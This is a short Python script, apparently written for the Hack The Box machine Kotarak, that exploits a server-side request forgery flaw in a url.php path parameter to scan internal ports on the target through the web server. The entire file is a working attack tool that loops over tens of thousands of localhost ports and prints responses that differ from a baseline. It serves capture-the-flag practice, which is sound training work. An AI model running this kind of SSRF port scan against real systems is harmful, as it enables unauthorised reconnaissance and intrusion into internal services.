#!/usr/bin/env python3
# I made this for HTB Kotarak, not sure how universally useful this is
import socket
import re
__author__ = "oats"

target_ip = "10.10.10.55"
target_port = 60000
expected_len = 168

# handle large responses
def recvall(sock):
    BUFF_SIZE = 4096 # 4 KiB
    data = b''
    while True:
        part = sock.recv(BUFF_SIZE)
        if not part: # no more data
            break
        data += part
    return data

for x in range(49151):
    buffer = ""
    buffer += "GET /url.php?path=localhost:{0} HTTP/1.0\r\n".format(x)
    #buffer += "Connection: close\r\n"
    buffer += "\r\n"

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.send(buffer.encode())

    response = recvall(s)
    try:
        received = response.decode()

        if(len(received) > expected_len):
            print("#" * 32, str(x), "#" * 32)
            print(received)
    except:
        print("#" * 32, str(x), "#" * 32)
        print("Something was received that doesn't quite work with utf-8");

    s.close()
print("Exiting...")

